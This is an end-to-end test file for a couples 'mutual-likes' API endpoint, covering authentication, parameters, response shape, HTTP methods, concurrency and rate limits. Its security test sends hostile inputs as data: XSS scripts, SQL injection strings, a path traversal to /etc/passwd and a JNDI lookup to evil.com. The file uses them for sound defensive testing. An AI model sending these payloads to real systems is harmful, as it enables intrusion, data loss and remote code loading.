/**
 * Improved E2E Tests for Couples Mutual Likes API - Real HTTP Requests
 * Tests the mutual-likes endpoint using real HTTP requests with comprehensive scenarios
 * Demonstrates realistic data patterns and edge cases
 */

import { describe, test, expect, beforeEach, afterEach } from 'vitest'
import { E2EHttpClient } from '../../utils/e2e-http-client'

describe('E2E Improved: /api/couples/mutual-likes', () => {
  let client: E2EHttpClient

  beforeEach(() => {
    client = new E2EHttpClient()
  })

  afterEach(async () => {
    await client.cleanup()
  })

  describe('Authentication & Authorization', () => {
    test('should return 401 for unauthenticated requests', async () => {
      const response = await client.unauthenticatedRequest('/api/couples/mutual-likes')
      const data = await response.json()

      expect(response.status).toBe(401)
      expect(data.error).toBe('Unauthorized')
    })

    test('should accept valid authentication tokens', async () => {
      try {
        await client.authenticateAs('test1@example.com', 'password123')
        const response = await client.get('/api/couples/mutual-likes')
        
        // Should not be 401 with valid auth
        expect(response.status).not.toBe(401)
        expect(response.status).toBeOneOf([200, 500]) // 200 for success, 500 for DB issues
      } catch (error) {
        // Test user may not exist yet - that's expected during setup
        console.log('Test user authentication failed (expected during setup):', error)
      }
    })

    test('should reject malformed authorization headers', async () => {
      const response = await client.request('/api/couples/mutual-likes', {
        headers: {
          'Authorization': 'Bearer invalid-token-format'
        },
        authenticated: false
      })
      const data = await response.json()

      expect(response.status).toBe(401)
      expect(data.error).toBe('Unauthorized')
    })

    test('should reject expired tokens gracefully', async () => {
      const response = await client.request('/api/couples/mutual-likes', {
        headers: {
          'Authorization': 'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjF9.invalid'
        },
        authenticated: false
      })
      const data = await response.json()

      expect(response.status).toBe(401)
      expect(data.error).toBe('Unauthorized')
    })
  })

  describe('Request Parameter Handling', () => {
    test('should handle includeProperties parameter variations', async () => {
      const testCases = [
        { query: {}, description: 'no parameters' },
        { query: { includeProperties: 'true' }, description: 'includeProperties=true' },
        { query: { includeProperties: 'false' }, description: 'includeProperties=false' },
        { query: { includeProperties: '1' }, description: 'includeProperties=1' },
        { query: { includeProperties: '0' }, description: 'includeProperties=0' },
        { query: { includeProperties: 'yes' }, description: 'includeProperties=yes' },
        { query: { includeProperties: 'no' }, description: 'includeProperties=no' },
      ]

      for (const testCase of testCases) {
        const response = await client.unauthenticatedRequest('/api/couples/mutual-likes', {
          query: testCase.query
        })
        const data = await response.json()

        // Should consistently return 401 for unauthenticated requests
        expect(response.status).toBe(401)
        expect(data.error).toBe('Unauthorized')
      }
    })

    test('should handle edge case parameter values', async () => {
      const edgeCases = [
        { includeProperties: '' },
        { includeProperties: ' ' },
        { includeProperties: 'null' },
        { includeProperties: 'undefined' },
        { includeProperties: '[]' },
        { includeProperties: '{}' },
      ]

      for (const query of edgeCases) {
        const response = await client.unauthenticatedRequest('/api/couples/mutual-likes', {
          query
        })
        
        // Should not crash on edge case values
        expect(response.status).toBe(401)
        const data = await response.json()
        expect(data.error).toBe('Unauthorized')
      }
    })

    test('should handle multiple query parameters gracefully', async () => {
      const response = await client.unauthenticatedRequest('/api/couples/mutual-likes', {
        query: {
          includeProperties: 'true',
          extraParam: 'value',
          anotherParam: '123',
          invalidParam: 'test'
        }
      })

      // Should ignore unknown parameters and not crash
      expect(response.status).toBe(401)
      const data = await response.json()
      expect(data.error).toBe('Unauthorized')
    })
  })

  describe('Response Structure & Content-Type', () => {
    test('should return proper JSON content-type', async () => {
      const response = await client.unauthenticatedRequest('/api/couples/mutual-likes')

      expect(response.headers.get('content-type')).toContain('application/json')
    })

    test('should have consistent error response structure', async () => {
      const response = await client.unauthenticatedRequest('/api/couples/mutual-likes')
      const data = await response.json()

      // Should have standardized error format
      expect(data).toHaveProperty('error')
      expect(typeof data.error).toBe('string')
      expect(data.error).not.toBe('')
      
      // Should not expose internal details
      expect(data).not.toHaveProperty('stack')
      expect(data).not.toHaveProperty('trace')
      expect(data).not.toHaveProperty('internal')
    })

    test('should handle JSON parsing edge cases', async () => {
      // Test that responses are consistently parseable
      const response = await client.unauthenticatedRequest('/api/couples/mutual-likes')
      
      // Should not throw when parsing JSON
      expect(async () => {
        await response.json()
      }).not.toThrow()
    })
  })

  describe('HTTP Method Support', () => {
    test('should support GET method', async () => {
      const response = await client.unauthenticatedRequest('/api/couples/mutual-likes', {
        method: 'GET'
      })

      expect(response.status).toBe(401) // Auth error, not method error
    })

    test('should reject unsupported HTTP methods', async () => {
      const unsupportedMethods = ['POST', 'PUT', 'DELETE', 'PATCH', 'HEAD'] as const

      for (const method of unsupportedMethods) {
        try {
          const response = await client.unauthenticatedRequest('/api/couples/mutual-likes', {
            method
          })

          // Should return 405 Method Not Allowed or similar
          expect(response.status).toBeOneOf([405, 401, 500])
        } catch (error) {
          // Some methods might be rejected at network level
          expect(error).toBeDefined()
        }
      }
    })

    test('should handle OPTIONS requests for CORS', async () => {
      try {
        const response = await client.unauthenticatedRequest('/api/couples/mutual-likes', {
          method: 'OPTIONS'
        })

        // OPTIONS should be handled appropriately
        expect(response.status).toBeOneOf([200, 204, 405])
      } catch (error) {
        // OPTIONS might not be implemented, which is acceptable
        expect(error).toBeDefined()
      }
    })
  })

  describe('Security & Input Validation', () => {
    test('should sanitize dangerous query parameters', async () => {
      const dangerousInputs = [
        { includeProperties: '<script>alert("xss")</script>' },
        { includeProperties: 'javascript:alert(1)' },
        { includeProperties: '"><script>alert(1)</script>' },
        { includeProperties: "'; DROP TABLE users; --" },
        { includeProperties: "' OR 1=1 --" },
        { includeProperties: '../../../etc/passwd' },
        { includeProperties: '${jndi:ldap://evil.com/a}' },
      ]

      for (const query of dangerousInputs) {
        try {
          const response = await client.unauthenticatedRequest('/api/couples/mutual-likes', {
            query
          })

          // Should not crash or expose vulnerabilities
          expect(response.status).toBeOneOf([200, 400, 401, 422, 500])
          
          const data = await response.json()
          expect(data).toBeDefined()
          expect(typeof data).toBe('object')
        } catch (error) {
          // Rejection of dangerous inputs is acceptable
          expect(error).toBeDefined()
        }
      }
    })

    test('should not expose sensitive information in errors', async () => {
      const response = await client.unauthenticatedRequest('/api/couples/mutual-likes')
      const data = await response.json()

      const _sensitiveKeywords = [
        'password', 'secret', 'key', 'token', 'private',
        'database', 'connection', 'internal', 'server',
        'stack', 'trace', 'error', 'exception'
      ]

      const errorString = JSON.stringify(data).toLowerCase()
      
      // Should not contain most sensitive keywords (except 'error' which is expected)
      expect(errorString).not.toContain('password')
      expect(errorString).not.toContain('secret')
      expect(errorString).not.toContain('key')
      expect(errorString).not.toContain('token')
      expect(errorString).not.toContain('stack')
      expect(errorString).not.toContain('trace')
    })

    test('should handle extremely long query parameters', async () => {
      const longValue = 'a'.repeat(10000)
      
      try {
        const response = await client.unauthenticatedRequest('/api/couples/mutual-likes', {
          query: { includeProperties: longValue }
        })

        // Should handle long inputs gracefully
        expect(response.status).toBeOneOf([200, 400, 401, 414, 500])
      } catch (error) {
        // Network-level rejection of oversized requests is acceptable
        expect(error).toBeDefined()
      }
    })
  })

  describe('Performance & Concurrency', () => {
    test('should respond within reasonable time limits', async () => {
      const startTime = Date.now()
      const response = await client.unauthenticatedRequest('/api/couples/mutual-likes')
      const endTime = Date.now()

      const responseTime = endTime - startTime
      expect(responseTime).toBeLessThan(10000) // 10 second max

      const data = await response.json()
      expect(data).toBeDefined()
    })

    test('should handle multiple concurrent requests', async () => {
      const concurrentRequests = Array.from({ length: 10 }, () =>
        client.unauthenticatedRequest('/api/couples/mutual-likes')
      )

      const responses = await Promise.all(concurrentRequests)

      // All requests should complete successfully
      responses.forEach((response) => {
        expect(response.status).toBeOneOf([200, 401, 429, 500])
      })

      // All responses should be parseable JSON
      const jsonPromises = responses.map(r => r.json())
      const jsonResponses = await Promise.all(jsonPromises)
      
      jsonResponses.forEach((data) => {
        expect(data).toBeDefined()
        expect(typeof data).toBe('object')
      })
    })

    test('should not cause memory leaks with repeated requests', async () => {
      // Make multiple sequential requests to check for memory issues
      for (let i = 0; i < 5; i++) {
        const response = await client.unauthenticatedRequest('/api/couples/mutual-likes')
        const data = await response.json()
        
        expect(response.status).toBe(401)
        expect(data).toBeDefined()
      }
    })
  })

  describe('Rate Limiting & Traffic Control', () => {
    test('should implement rate limiting protection', async () => {
      // Make rapid requests to test rate limiting
      const rapidRequests = Array.from({ length: 20 }, () =>
        client.unauthenticatedRequest('/api/couples/mutual-likes')
      )

      const responses = await Promise.all(rapidRequests)

      // Should either allow all requests or apply rate limiting
      responses.forEach((response) => {
        expect(response.status).toBeOneOf([200, 401, 429, 500])
      })

      // If rate limiting is applied, should see 429 status codes
      const _rateLimitedResponses = responses.filter(r => r.status === 429)
      
      // Rate limiting behavior depends on configuration
      // Just ensure no crashes occur
      expect(responses.length).toBe(20)
    })
  })

  describe('Authenticated Response Validation', () => {
    test('should return structured data for authenticated users', async () => {
      try {
        await client.authenticateAs('test1@example.com', 'password123')
        
        const response = await client.get('/api/couples/mutual-likes')
        
        if (response.ok) {
          const data = await response.json()
          
          // Should have expected top-level structure
          expect(data).toHaveProperty('mutualLikes')
          expect(Array.isArray(data.mutualLikes)).toBe(true)
          expect(data).toHaveProperty('performance')
          
          // Performance metrics should be present
          expect(data.performance).toHaveProperty('totalTime')
          expect(data.performance).toHaveProperty('count')
          expect(data.performance).toHaveProperty('cached')
          
          // Types should be correct
          expect(typeof data.performance.totalTime).toBe('number')
          expect(typeof data.performance.count).toBe('number')
          expect(typeof data.performance.cached).toBe('boolean')
        }
      } catch (error) {
        // Expected during test setup
        console.log('Test user authentication failed (expected during setup):', error)
      }
    })

    test('should handle includeProperties parameter correctly when authenticated', async () => {
      try {
        await client.authenticateAs('test1@example.com', 'password123')
        
        // Test without properties
        const responseWithoutProps = await client.get('/api/couples/mutual-likes?includeProperties=false')
        
        if (responseWithoutProps.ok) {
          const dataWithoutProps = await responseWithoutProps.json()
          expect(dataWithoutProps.mutualLikes).toBeDefined()
        }
        
        // Test with properties
        const responseWithProps = await client.get('/api/couples/mutual-likes?includeProperties=true')
        
        if (responseWithProps.ok) {
          const dataWithProps = await responseWithProps.json()
          expect(dataWithProps.mutualLikes).toBeDefined()
          
          // If data exists, properties should be included/excluded appropriately
          if (dataWithProps.mutualLikes.length > 0) {
            // Each mutual like should have the property field when includeProperties=true
            dataWithProps.mutualLikes.forEach((like: any) => {
              expect(like).toHaveProperty('property')
            })
          }
        }
      } catch (error) {
        // Expected during test setup
        console.log('Test user authentication failed (expected during setup):', error)
      }
    })

    test('should maintain data consistency across requests', async () => {
      try {
        await client.authenticateAs('test1@example.com', 'password123')
        
        // Make multiple requests and ensure consistency
        const responses = await Promise.all([
          client.get('/api/couples/mutual-likes'),
          client.get('/api/couples/mutual-likes'),
          client.get('/api/couples/mutual-likes')
        ])

        const validResponses = responses.filter(r => r.ok)
        
        if (validResponses.length > 1) {
          const dataArray = await Promise.all(validResponses.map(r => r.json()))
          
          // Structure should be consistent
          dataArray.forEach((data) => {
            expect(data).toHaveProperty('mutualLikes')
            expect(data).toHaveProperty('performance')
            expect(Array.isArray(data.mutualLikes)).toBe(true)
          })
        }
      } catch (error) {
        // Expected during test setup
        console.log('Test user authentication failed (expected during setup):', error)
      }
    })
  })
})